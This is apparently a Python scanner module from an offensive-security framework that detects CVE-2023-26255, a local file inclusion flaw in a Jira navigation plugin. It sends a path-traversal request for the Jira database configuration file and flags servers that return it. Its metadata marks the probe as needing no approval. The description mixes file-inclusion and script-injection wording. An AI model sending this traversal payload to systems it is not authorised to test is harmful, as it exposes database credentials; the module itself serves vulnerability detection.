#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""STAGIL Navigation for Jira Menu & Themes plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion Detection',
        'description': 'STAGIL Navigation for Jira Menu & Themes plugin before 2.0.52 is susceptible to local file inclusion via modifying the fileName parameter to the snjCustomDesignConfig endpoint. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can potentially allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'jira', 'cms', 'atlassian', 'stagil', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26255.md',
            'https://marketplace.atlassian.com/apps/1216090/stagil-navigation-for-jira-menus-themes?tab=overview&hosting=cloud',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-26255',
            'https://github.com/nomi-sec/PoC-in-GitHub',
            'https://github.com/tucommenceapousser/CVE-2023-26255-Exp',
        ],
        'cve': 'CVE-2023-26255',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<jira-database-config>',)
        header_any = ('$textMime',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion detected",
                path='/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime',
            )
            return True
        return False

